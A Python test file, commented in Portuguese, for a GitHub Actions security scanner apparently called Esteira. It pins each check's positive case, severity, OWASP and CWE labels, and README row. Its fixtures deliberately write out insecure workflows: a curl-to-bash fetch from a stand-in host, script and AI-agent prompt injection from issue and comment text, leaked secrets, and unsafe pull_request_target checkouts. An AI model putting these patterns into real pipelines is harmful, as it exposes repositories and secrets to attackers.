"""Invariantes do catálogo: caso positivo, severidade, edição do OWASP e sincronia do README.

A rede que estes testes formam existe porque a suíte inteira ficava verde com o código de
produção sabotado: rebaixar `script-injection` de CRITICAL para LOW abria o portão do CI
(exit 1 → exit 0) sem um único teste vermelho, e uma checagem nova podia nascer sem nenhum
caso que a exercitasse. Aqui a disciplina vira invariante — checagem nova nasce vermelha até
ter um caso positivo, uma severidade declarada e uma linha no README.
"""

from __future__ import annotations

import re
import textwrap
from pathlib import Path

import pytest

from esteira.checks.catalog import CATALOG, OWASP_EDITION
from esteira.checks.engine import scan
from esteira.core.models import Severity

_SHA = "b4ffde65f46336ab88eb53be808477a3936bae11"
_RAIZ = Path(__file__).resolve().parent.parent


def _steps(corpo: str, *, trigger: str = "push", permissions: str = "permissions: {}\n") -> str:
    return f"on: {trigger}\n{permissions}jobs:\n  b:\n    runs-on: ubuntu-latest\n" + corpo


# Um workflow por ID do catálogo — o caso que DEVE fazer aquela checagem disparar.
CASOS_POSITIVOS: dict[str, str] = {
    "script-injection": _steps(
        '    steps:\n      - run: echo "${{ github.event.issue.title }}"\n', trigger="issues"
    ),
    "pull-request-target-checkout": _steps(
        "    steps:\n      - uses: actions/checkout@v4\n"
        "        with:\n          ref: ${{ github.head_ref }}\n",
        trigger="pull_request_target",
    ),
    "ai-agent-write-injection": _steps(
        "    steps:\n      - uses: anthropics/claude-code-action@v1\n"
        "        with:\n          prompt: ${{ github.event.comment.body }}\n",
        trigger="issue_comment",
        permissions="permissions:\n  contents: write\n  pull-requests: write\n",
    ),
    "unpinned-action-thirdparty": _steps("    steps:\n      - uses: some-org/evil-action@v1\n"),
    "unpinned-action-firstparty": _steps("    steps:\n      - uses: actions/checkout@v4\n"),
    "unpinned-reusable-workflow": (
        "on: push\npermissions: {}\njobs:\n  a:\n"
        "    uses: some-org/repo/.github/workflows/ci.yml@main\n"
    ),
    "unpinned-container-image": _steps(
        "    container:\n      image: node:18\n    steps:\n      - run: echo oi\n"
    ),
    "secret-to-thirdparty-action": _steps(
        "    steps:\n      - uses: some-org/deploy-action@v1\n"
        "        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n"
    ),
    "secrets-inherit": (
        "on: push\npermissions: {}\njobs:\n  call:\n"
        "    uses: org/repo/.github/workflows/ci.yml@main\n    secrets: inherit\n"
    ),
    "secret-in-run": _steps('    steps:\n      - run: echo "token=${{ secrets.API_TOKEN }}"\n'),
    "insecure-commands": _steps(
        "    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"
        "    steps:\n      - run: echo oi\n"
    ),
    "curl-pipe-shell": _steps("    steps:\n      - run: curl https://x.invalid/i.sh | bash\n"),
    "self-hosted-runner": (
        "on: push\npermissions: {}\njobs:\n  b:\n    runs-on: self-hosted\n"
        "    steps:\n      - run: echo oi\n"
    ),
    "dangerous-trigger": _steps(
        "    steps:\n      - run: echo oi\n", trigger="pull_request_target"
    ),
    "broad-permissions": _steps(
        "    steps:\n      - run: echo oi\n", permissions="permissions: write-all\n"
    ),
    "missing-permissions": (
        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n"
    ),
    "checkout-credentials-in-artifact": _steps(
        f"    steps:\n      - uses: actions/checkout@{_SHA}\n"
        f"      - uses: actions/upload-artifact@{_SHA}\n"
        "        with:\n          name: build\n          path: .\n"
    ),
    "invalid-yaml": "on: push\njobs: [este flow nunca fecha\n",
}


def _ids(tmp_path: Path, texto: str) -> set[str]:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / "w.yml").write_text(texto, encoding="utf-8")
    return {f.check_id for f in scan(tmp_path).findings}


def test_todo_id_do_catalogo_tem_caso_positivo() -> None:
    """Checagem nova sem caso que a exercite não entra: o meta-teste falha antes."""
    assert set(CATALOG) == set(CASOS_POSITIVOS)


@pytest.mark.parametrize("check_id", sorted(CASOS_POSITIVOS))
def test_caso_positivo_realmente_dispara(tmp_path: Path, check_id: str) -> None:
    assert check_id in _ids(tmp_path, CASOS_POSITIVOS[check_id])


# --------------------------------------------------------------------------- #
# severidade: é o par (severidade + --fail-on) que decide se o CI do cliente
# reprova. Rebaixar uma linha deste dict tem de exigir mexer neste teste.
# --------------------------------------------------------------------------- #

SEVERIDADES: dict[str, Severity] = {
    "script-injection": Severity.CRITICAL,
    "pull-request-target-checkout": Severity.CRITICAL,
    "ai-agent-write-injection": Severity.HIGH,
    "unpinned-action-thirdparty": Severity.HIGH,
    "secret-to-thirdparty-action": Severity.HIGH,
    "broad-permissions": Severity.HIGH,
    "secret-in-run": Severity.HIGH,
    "checkout-credentials-in-artifact": Severity.HIGH,
    "insecure-commands": Severity.HIGH,
    "invalid-yaml": Severity.HIGH,
    "curl-pipe-shell": Severity.MEDIUM,
    "self-hosted-runner": Severity.MEDIUM,
    "secrets-inherit": Severity.MEDIUM,
    "dangerous-trigger": Severity.LOW,
    "unpinned-action-firstparty": Severity.LOW,
    "unpinned-reusable-workflow": Severity.LOW,
    "unpinned-container-image": Severity.LOW,
    "missing-permissions": Severity.LOW,
}


def test_severidade_de_toda_checagem_esta_fixada() -> None:
    assert {cid: meta.severity for cid, meta in CATALOG.items()} == SEVERIDADES


# --------------------------------------------------------------------------- #
# OWASP: a suíte inteira fala a edição 2025. 'A03' significa coisas opostas
# entre 2021 e 2025 — misturar edições corrompe o registro de risco do cliente.
# --------------------------------------------------------------------------- #

_CODIGOS_2025 = tuple(f"A{n:02d}:{OWASP_EDITION}" for n in range(1, 11))


def test_rotulos_owasp_sao_da_edicao_declarada() -> None:
    fora = {
        cid: meta.owasp
        for cid, meta in CATALOG.items()
        if meta.owasp is not None and not meta.owasp.startswith(_CODIGOS_2025)
    }
    assert fora == {}


def test_toda_checagem_tem_recomendacao_e_cwe() -> None:
    sem_metadado = {
        cid: (meta.recommendation, meta.cwe)
        for cid, meta in CATALOG.items()
        if not meta.recommendation.strip() or not (meta.cwe or "").startswith("CWE-")
    }
    assert sem_metadado == {}


# --------------------------------------------------------------------------- #
# README: a tabela é a vitrine comercial. Documentar 11 de 16 checagens (e com
# severidade errada) é subvender o produto e prometer o que ele não entrega.
# --------------------------------------------------------------------------- #

_LINHA_TABELA = re.compile(r"^\|\s*`([a-z0-9-]+)`\s*\|.*?\|\s*[^\w\s]*\s*(\w+)\s*\|", re.MULTILINE)
_SEVERIDADE_PT = {
    "Crítica": Severity.CRITICAL,
    "Alta": Severity.HIGH,
    "Média": Severity.MEDIUM,
    "Baixa": Severity.LOW,
}


def _tabela_do_readme() -> dict[str, Severity]:
    texto = (_RAIZ / "README.md").read_text(encoding="utf-8")
    return {
        cid: _SEVERIDADE_PT[rotulo]
        for cid, rotulo in _LINHA_TABELA.findall(texto)
        if cid in CATALOG
    }


def test_readme_documenta_todas_as_checagens() -> None:
    assert set(_tabela_do_readme()) == set(CATALOG)


def test_readme_declara_a_severidade_real() -> None:
    divergentes = {
        cid: (rotulo, CATALOG[cid].severity)
        for cid, rotulo in _tabela_do_readme().items()
        if rotulo is not CATALOG[cid].severity
    }
    assert divergentes == {}


# Uma linha de INSTRUÇÃO (`pip install esteira` / `- run: pipx install esteira`), distinta da
# menção entre crases dentro do aviso que existe justamente para desaconselhar o comando.
_INSTALA_DO_PYPI = re.compile(r"^\s*(?:-\s*run:\s*)?pipx?\s+install\s+esteira\s*$", re.MULTILINE)


def test_documentacao_nao_manda_instalar_do_pypi() -> None:
    """`pip install esteira` puxa o pacote de OUTRA pessoa no PyPI (e o comando nem existe lá)."""
    for arquivo in ("README.md", "CHANGELOG.md"):
        texto = (_RAIZ / arquivo).read_text(encoding="utf-8")
        assert _INSTALA_DO_PYPI.search(texto) is None, arquivo


def _receita_de_ci_do_readme() -> str:
    """Os steps do bloco ```yaml que segue '### No próprio GitHub Actions', do README real."""
    texto = (_RAIZ / "README.md").read_text(encoding="utf-8")
    trecho = texto.split("### No próprio GitHub Actions", 1)[1]
    return trecho.split("```yaml", 1)[1].split("```", 1)[0].strip("\n")


def test_receita_de_ci_do_readme_passa_no_proprio_esteira(tmp_path: Path) -> None:
    """A receita PUBLICADA no README — lida do arquivo — não pode gerar achado do Esteira.

    É o gate contra o `uses: …@v3` na documentação: ensinar action por tag no README é
    exatamente o que a ferramenta reprova (`unpinned-action-firstparty`).
    """
    steps = textwrap.indent(textwrap.dedent(_receita_de_ci_do_readme()), "      ")
    workflow = (
        "on: push\npermissions:\n  contents: read\njobs:\n  auditoria:\n"
        "    runs-on: ubuntu-latest\n    steps:\n" + steps + "\n"
    )
    assert _ids(tmp_path, workflow) == set()
